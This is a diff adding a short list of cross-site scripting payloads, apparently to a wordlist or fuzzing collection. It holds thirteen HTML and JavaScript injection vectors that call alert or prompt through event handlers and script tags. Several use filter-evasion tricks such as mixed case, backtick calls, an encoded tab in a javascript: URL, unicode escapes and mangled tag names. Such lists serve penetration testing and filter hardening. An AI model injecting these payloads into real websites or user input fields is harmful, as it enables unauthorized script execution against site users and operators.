@@ -1,0 +1,13 @@
+<p onclick=prompt`1`>d3let
+<scripT>alert`1`</scripT>
+<Img src=x onerror=alert1>
+<iMg src=x onerror=alert`1`>
+<marquee onstart=alert`1`>
+<body onmouseover=alert`grave`>
+<body onmouseout=alert`grave`>
+<a href="javas%09cript:\u0061lert`1`">
+<xss onclick=al\u0065rt`2`>click</xss>
+<b onmouseup=prompt`1`></b>
+<s/c/r/ipt>prompt`1`</s(c(r(ipt>
+<html onwheel=prompt`1`>xss
+<html onkeydown=prompt`1`>xss
